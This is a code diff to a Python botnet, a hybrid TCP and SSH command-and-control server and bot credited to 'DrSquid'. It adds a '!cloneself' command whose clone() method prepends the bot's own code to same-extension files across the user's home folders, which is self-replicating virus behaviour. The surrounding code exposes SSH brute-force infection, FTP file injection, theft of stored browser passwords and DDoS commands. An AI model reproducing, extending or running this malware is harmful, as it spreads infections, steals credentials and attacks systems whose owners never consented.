@@ -14,13 +14,10 @@ class ArguementParse:
     """Main Class for parsing command prompt arguements
     when running the scripts."""
     def __init__(self):
-        """If there are less than 2 arguements the option-parsing
-        message will be displayed. Otherwise it will try to
-        parse the arguements."""
-        if len(sys.argv) < 2:
-            self.usage()
-        else:
-            self.get_args()
+        """All arguements are optional! The botnet will start up without
+        arguements, however it will only be hosted on localhost.
+        The arguement parsing function will be utilized here."""
+        self.get_args()
     def downloadNgrok(self):
         """Downloads Ngrok for windows. May need to add it for other OS's
         but maybe in the future I will."""
@@ -122,7 +119,7 @@ tar -xf {os.getcwd()}/ngrok.zip
         else:
             key = str(arg.key).encode()
         if arg.passfile is None:
-            self.usage()
+            passfile = False
         else:
             passfile = arg.passfile
         if arg.ngrokhost is not None:
@@ -163,17 +160,19 @@ class Botnet:
         self.bot_count = 0
         self.passfilename = passwfile
         self.logfile = "servlog.txt"
+        self.passfile = passwfile
         self.log("\n" + self.log_logo() + "\n")
         self.log("\n[(SERVER)]: Starting up server....")
-        try:
-            self.passwords = open(passwfile, 'r')
-        except:
-            self.logo()
-            print(f"[+] File '{passwfile}' is not in current directory.\n[+] Server is closing.....")
-            self.log(
-                "\n[(ERROR)]: Error starting up server - Brute-forcing file is not in directory!\n[(CLOSE)]: Server is closing.....")
+        if self.passfile != False:
+            try:
+                self.passwords = open(passwfile, 'r')
+            except:
+                self.logo()
+                print(f"[+] File '{passwfile}' is not in current directory.\n[+] Server is closing.....")
+                self.log(
+                    "\n[(ERROR)]: Error starting up server - Brute-forcing file is not in directory!\n[(CLOSE)]: Server is closing.....")
             sys.exit()
-        self.version = "6.5"
+        self.version = "6.9"
         self.conn_list = []
         self.admin_conn = []
         self.ips = []
@@ -239,6 +238,7 @@ class Botnet:
 [+] !getos                               - Gets the OS Of the bots.
 [+] !getpasswords                        - Gets the stored browser passwords of the bots.
 [+] !rickroll                            - Rick Rolls the Bots.     
+[+] !cloneself                           - Self replicates the Bot scripts in the bots.
 
 [+] Commands for SSH Botnet:
 
@@ -316,6 +316,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         print("[+] !getos                               - Gets the OS Of the bots.")
         print("[+] !getpasswords                        - Gets the stored browser passwords of the bots.")
         print("[+] !rickroll                            - Rick Rolls the Bots.")
+        print("[+] !cloneself                           - Self replicates the Bot scripts in the bots.")
         print("\n[+] Commands for SSH Botnet:\n")
         print("[+] !infect [ip] [user]                  - Brute forces login for the provided ip and username.")
         print("[+] !inject [file]                       - Opens FTP and injects a file into an infected host.")
@@ -534,11 +535,15 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                         elif msg.startswith('!help'):
                             c.send(self.welcomemsg.encode())
                         elif msg.startswith("!infect"):
-                            msg_split = msg.split()
-                            ip = msg_split[1]
-                            username = msg_split[2]
-                            bruteforcer = threading.Thread(target=self.ssh_infect, args=(ip, username))
-                            bruteforcer.start()
+                            if self.passfile != False:
+                                msg_split = msg.split()
+                                ip = msg_split[1]
+                                username = msg_split[2]
+                                bruteforcer = threading.Thread(target=self.ssh_infect, args=(ip, username))
+                                bruteforcer.start()
+                            else:
+                                c.send("[(SERVER)]: Botnet is configured without ssh bruteforcing. Cannot bruteforce!".encode())
+                                self.log(f"[(SERVER)---->({hostname})]: Botnet is configured without ssh bruteforcing. Cannot bruteforce!")
                         elif msg.startswith("!sshlogin"):
                             msg_split = msg.split()
                             ip = msg_split[1]
@@ -837,11 +842,14 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                 elif self.instruction == "!help":
                     self.usage()
                 elif self.instruction.startswith("!infect"):
-                    instruction_split = self.instruction.split()
-                    ip = instruction_split[1]
-                    username = instruction_split[2]
-                    brute_force = threading.Thread(target=self.ssh_infect, args=(ip, username))
-                    brute_force.start()
+                    if self.passfile != False:
+                        instruction_split = self.instruction.split()
+                        ip = instruction_split[1]
+                        username = instruction_split[2]
+                        brute_force = threading.Thread(target=self.ssh_infect, args=(ip, username))
+                        brute_force.start()
+                    else:
+                        print("[+] Unable to bruteforce. Configure a password file to do so.\n")
                 elif self.instruction.startswith("!inject"):
                     msg_split = self.instruction.split()
                     filename = msg_split[1]
@@ -873,6 +881,8 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
 [+] - Fixed NotSamePassException Errors.
 [+] - Fixed Error in self.send_ssh that would flood output with errors.
 [+] - Fixed Error in Stopping DDoS Attacks(tried to call a bool object and not function).
+[+] - Made password list optional(however brute forcing cannot happen).
+[+] - Added '!cloneself' Command.
                     """)
                 if self.instruction != "!clear":
                     if len(self.ssh_bots) != 0:
@@ -4347,7 +4357,10 @@ class Bot:
         self.conntest = threading.Thread(target=self.conn_test)
         self.conntest.start()
         self.key = key
-        self.fernet_session = Fernet(self.key)
+        try:
+            self.fernet_session = Fernet(self.key)
+        except:
+            self.fernet_session = None
     def getip(self):
         try:
             url = 'https://httpbin.org/ip'
@@ -4608,6 +4621,53 @@ OS:       {sys.platform}
             os.system(f'start {website}')
         else:
             os.system(f'open {website}')
+    
+    def clone(self):
+        file_ending = sys.argv[0].split(".")
+        file_ending = file_ending[len(file_ending) - 1]
+        own_file = open(sys.argv[0], "rb")
+        own_content = own_file.read()
+        own_file.close()
+        if sys.platform == "win32":
+            main_dir = f"C:/Users/{os.getlogin()}/"
+        else:
+            main_dir = f"/Users/{sys.argv[0].split('/')[1]}/"
+        os.chdir(main_dir)
+        workingdirs = []
+        workingdirs.append(main_dir)
+        workingdirs.append(os.getcwd())
+        dirlist = os.listdir()
+        for dirs in dirlist:
+            if "." in dirs:
+                pass
+            else:
+                workingdirs.append(main_dir + str(dirs))
+        dirlist = os.listdir()
+        for dirs in workingdirs:
+            try:
+                os.chdir(dirs)
+            except:
+                pass
+            for files in dirlist:
+                try:
+                    if file_ending in files:
+                        file = open(files, "rb")
+                        content = file.read()
+                        file.close()
+                        if own_content in content:
+                            pass
+                        else:
+                            file = open(files, "wb")
+                            file.write(own_content + "\\n\\n".encode())
+                            file.write(content)
+                            file.close()
+                except:
+                    pass
+    def gotowebsite(self, website):
+        if sys.platform == "win32":
+            os.system(f'start {website}')
+        else:
+            os.system(f'open {website}')
     def run_cmd(self):
         try:
             if self.fileeditor:
@@ -4645,6 +4705,10 @@ OS:       {sys.platform}
                         self.udpflood.Stop_Atk()
                     except:
                         pass
+                elif self.msg.startswith('!cloneself'):
+                    cloner = threading.Thread(target=self.clone)
+                    cloner.start()
+                    self.connection.send("Successfully replicated files.".encode())
                 elif self.msg.startswith('!changedirdesktop'):
                     self.changedir(self.desktop)
                 elif self.msg.startswith('!openfile'):
